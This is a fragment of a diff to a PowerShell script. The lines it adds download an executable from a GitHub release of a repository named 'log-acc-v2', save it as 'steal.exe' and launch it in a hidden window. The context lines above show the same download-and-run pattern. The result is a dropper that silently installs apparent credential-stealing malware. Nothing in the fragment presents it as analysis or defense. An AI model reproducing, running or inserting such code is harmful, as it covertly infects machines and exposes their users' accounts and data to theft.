@@ -52,3 +52,13 @@ if (Test-Path -Path $output) {
     Invoke-WebRequest -Uri $url -OutFile $output
     Start-Process -WindowStyle Hidden -FilePath $output
 }
+
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/tootls.exe"
+$output = "$dir\steal.exe"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+    Start-Process -WindowStyle Hidden -FilePath $output
+}
